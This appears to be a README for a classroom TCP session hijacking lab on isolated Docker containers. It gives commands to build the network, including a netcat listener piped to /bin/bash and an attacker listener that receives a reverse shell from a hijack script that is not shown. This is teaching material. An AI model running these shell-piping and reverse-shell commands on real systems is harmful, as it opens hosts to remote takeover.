# TCP SESSION HIJACKING

### 1. Create NetOne Network
    docker network create --subnet 10.2.5.0/24 NetOne --driver bridge
### 2. Launch Server Container in Privileged Mode
    docker run -it --privileged --network NetOne --name Server --ip 10.2.5.3 myubuntu 
### 3. Launch Client and Attacker Containers
    docker run -it --network NetOne --name Client --ip 10.2.5.2 myubuntu 
    docker run -it --network host --name Attacker myubuntu
### 4. Create NetCat Listener on Server Container
    nc -l 80 | /bin/bash
### 5. Connect Client to Server
    nc 10.2.5.3 80
### 6. Create NetCat Listener & Launch Hijack From Attacker Container
    nc -lnv 1337 & python3 sniff_and_hijack.py
### 7. Send any message from client to server to hijack the server
### 8. Reverse shell now active in attacker container, move to foreground with
    fg nc
